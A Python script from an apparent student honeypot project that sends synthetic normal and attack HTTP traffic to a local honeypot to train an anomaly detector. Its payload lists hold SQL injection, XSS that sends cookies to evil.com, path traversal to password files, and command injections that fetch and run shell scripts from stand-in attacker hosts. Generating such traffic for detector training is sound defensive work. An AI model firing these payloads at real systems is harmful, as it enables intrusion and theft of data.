"""
http_generator.py — Honeypot Intelligent
==========================================
Synthetic HTTP traffic generator for cold-start model training.

Solves the cold-start problem: Isolation Forest cannot be trained without data.
In an academic / local environment there are no real external attackers, so this
generator produces realistic HTTP traffic that is processed by the real pipeline
(webhoneypot Flask → http_events.jsonl → collector.py → SQLite).

Three operating modes (set via MODE env var):
    normal     — legitimate browsing traffic only  (60% GET / 40% POST)
    suspicious — attack traffic only
    mixed      — 60% normal + 40% suspicious  [default]

Deliberate variability (random IPs, User-Agents, delays) prevents the model
from learning artificial patterns instead of genuine behavioral anomalies.

Usage (inside docker-compose):
    docker compose run --rm generator   # uses MODE env from compose file

Author  : Hafsa Daoudim
Project : Final Training Project, JobInTech 2026
"""

import os
import random
import time
import requests

# Configuration — overridable via environment variables #
BASE_URL  = os.getenv("BASE_URL",   "http://webhoneypot:8081")
MODE      = os.getenv("MODE",       "mixed")    # normal | suspicious | mixed
COUNT     = int(os.getenv("COUNT",  "300"))     # Total requests to send
DELAY_MIN = float(os.getenv("DELAY_MIN", "0.3"))  # Min sleep between requests (seconds)
DELAY_MAX = float(os.getenv("DELAY_MAX", "2.5"))  # Max sleep — mimics human browsing pace

# Normal traffic paths #
# These paths pass is_boring_http_event() because they carry a query, body or
# non-trivial path, ensuring they produce useful training samples.

NORMAL_PATHS_GET = [
    "/login?user=john",
    "/login?user=alice&redirect=/dashboard",
    "/register?ref=homepage",
    "/search?q=laptop",
    "/search?q=shoes&category=sport",
    "/search?q=wireless+keyboard&page=2",
    "/api/user/profile",
    "/api/user/profile?id=42",
    "/api/products?page=2",
    "/api/products?category=electronics&sort=price",
    "/api/orders?status=pending",
    "/api/orders?user_id=17&limit=10",
    "/dashboard",
    "/dashboard?view=monthly",
    "/profile?id=42",
    "/profile?id=88&tab=settings",
    "/upload",
    "/reset-password?token=abc123",
    "/verify?email=john@example.com",
    "/api/notifications?unread=true",
]

NORMAL_PATHS_POST = [
    "/login", "/register", "/upload",
    "/api/user/update", "/api/comment",
    "/api/orders/create", "/api/auth/refresh",
    "/contact",       # Has a body → passes the noise filter
    "/api/feedback",
]

NORMAL_POST_BODIES = [
    {"username": "john",  "password": "pass123"},
    {"username": "alice", "password": "secret456"},
    {"email": "user@example.com", "password": "mypassword"},
    {"name": "John Doe", "email": "john@example.com", "message": "Hello"},
    {"title": "My post", "body": "Some content here", "author": "alice"},
    {"token": "eyJhbGciOiJIUzI1NiJ9.abc.def"},
    {"product_id": "42", "quantity": "2", "user_id": "17"},
    {"feedback": "Great service!", "rating": "5"},
]

# Attack traffic patterns #
# Covers the main web attack categories detected by expert rules and ML:
# path traversal, SQLi, XSS, RCE / command injection, scanner probing, overflow.

MALICIOUS_PATTERNS = [
    # Path traversal / LFI
    "/../../../../etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    # SQL injection
    "/login?user=admin'+OR+1=1--",
    "/search?id=1'+UNION+SELECT+1,2,3--",
    "/api/user?id=1+AND+SLEEP(5)--",
    # XSS
    "/search?q=<script>alert(1)</script>",
    "/comment?post=1&text=<img src=x onerror=alert(1)>",
    "/profile?name=<svg onload=alert(document.cookie)>",
    # RCE / OS command injection
    "/ping?ip=127.0.0.1;cat+/etc/passwd",
    "/exec?cmd=id;uname+-a",
    "/vulnerable_endpoint?param=$(whoami)",
    "/api/run?cmd=`id`",
    "/api/exec?input=;wget+http://evil.com/shell.sh",
    # Scanner / reconnaissance probing
    "/admin", "/phpmyadmin", "/wp-login.php",
    "/.env", "/server-status", "/actuator/env", "/api/v1/config",
    # Buffer-overflow style long values
    "/login?user=" + "A" * 500,
    "/api?token="  + "B" * 300,
]

MALICIOUS_POST_BODIES = [
    {"username": "admin' OR '1'='1",  "password": "anything"},
    {"cmd":   "cat /etc/passwd"},
    {"input": "; rm -rf /tmp/*"},
    {"query": "1 UNION SELECT username,password FROM users--"},
    {"data":  "<script>document.location='http://evil.com?c='+document.cookie</script>"},
    {"file":  "../../../etc/shadow"},
    {"payload": "$(curl http://attacker.com/shell.sh | bash)"},
]

# User-Agent pools #
# Normal UAs mimic real browser fingerprints.
# Scanner UAs are distinctive, high ua_entropy in the feature vector.

USER_AGENTS_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
]

USER_AGENTS_SCANNER = [
    "sqlmap/1.8.0#stable",
    "nikto/2.5.0",
    "Nuclei - https://github.com/projectdiscovery/nuclei",
    "masscan/1.3",
    "Mozilla/5.0 zgrab/0.x",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "Go-http-client/1.1",
    "WhatWeb/0.5.5",
]


# Request dispatcher #

def do_request():
    """
    Send one HTTP request (normal or malicious) based on the current MODE.

    Mixed mode: 40% of requests are attack traffic, 60% are normal.
    Malicious requests include a random X-Forwarded-For header to simulate
    diverse source IPs; prevents the model from over-fitting to a single IP.
    HEAD and OPTIONS are excluded: they produce no useful features.
    """
    is_susp = (MODE == "suspicious") or (MODE == "mixed" and random.random() < 0.40)

    if not is_susp:
        # Normal traffic — GET or POST with realistic content
        method  = random.choices(["GET", "POST"], weights=[6, 4])[0]
        headers = {"User-Agent": random.choice(USER_AGENTS_NORMAL)}

        if method == "GET":
            url = BASE_URL + random.choice(NORMAL_PATHS_GET)
            try: requests.get(url, headers=headers, timeout=4)
            except Exception: pass

        else:
            url  = BASE_URL + random.choice(NORMAL_PATHS_POST)
            body = random.choice(NORMAL_POST_BODIES)
            try: requests.post(url, headers=headers, data=body, timeout=4)
            except Exception: pass

    else:
        # Attack traffic: randomized IP and UA for realistic diversity
        method  = random.choices(["GET", "POST"], weights=[6, 4])[0]
        headers = {
            "User-Agent": random.choice(USER_AGENTS_SCANNER + USER_AGENTS_NORMAL),
            # Spoofed source IP — avoids single-IP bias in frequency features
            "X-Forwarded-For": (
                f"{random.randint(1,255)}.{random.randint(0,255)}"
                f".{random.randint(0,255)}.{random.randint(1,254)}"
            ),
            "Accept-Language": "en-US,en;q=0.5" if random.random() > 0.5 else "ru-RU,ru;q=0.9"
        }

        if method == "GET":
            url = BASE_URL + random.choice(MALICIOUS_PATTERNS)
            try: requests.get(url, headers=headers, timeout=4)
            except Exception: pass

        else:
            path = random.choice(MALICIOUS_PATTERNS + ["/login", "/upload", "/api/exec"])
            body = random.choice(MALICIOUS_POST_BODIES)
            url  = BASE_URL + path
            try: requests.post(url, headers=headers, data=body, timeout=4)
            except Exception: pass


# Entry point #

def main():
    """
    Send COUNT requests at randomized intervals [DELAY_MIN, DELAY_MAX].
    Variable delays prevent the frequency feature from being artificially inflated,
    producing a more realistic req_60s distribution in the training data.
    """
    print(f"[gen_http] mode={MODE}  count={COUNT}  target={BASE_URL}")

    for i in range(COUNT):
        do_request()
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
        if (i + 1) % 50 == 0:
            print(f"[gen_http] {i + 1}/{COUNT} requests sent")

    print("[gen_http] done.")


if __name__ == "__main__":
    main()